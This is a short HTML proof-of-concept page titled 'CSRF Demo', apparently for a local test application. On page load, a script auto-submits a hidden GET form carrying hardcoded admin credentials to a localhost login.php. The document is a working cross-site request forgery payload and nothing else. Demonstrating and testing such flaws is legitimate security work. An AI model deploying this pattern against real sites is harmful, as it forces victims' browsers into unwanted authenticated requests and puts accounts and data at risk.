<!DOCTYPE html>
<html>
<head><title>CSRF Demo</title><link rel="stylesheet" href="assets/css/main.css"></head>
<body>
    <div class="container">
        <h2>CSRF Demo</h2>
        <form action="http://localhost/yummy-red-1.0.0/login.php" method="GET">
            <input type="hidden" name="username" value="admin">
            <input type="hidden" name="password" value="admin123">
        </form>
        <script>document.forms[0].submit();</script>
    </div>
</body>
</html>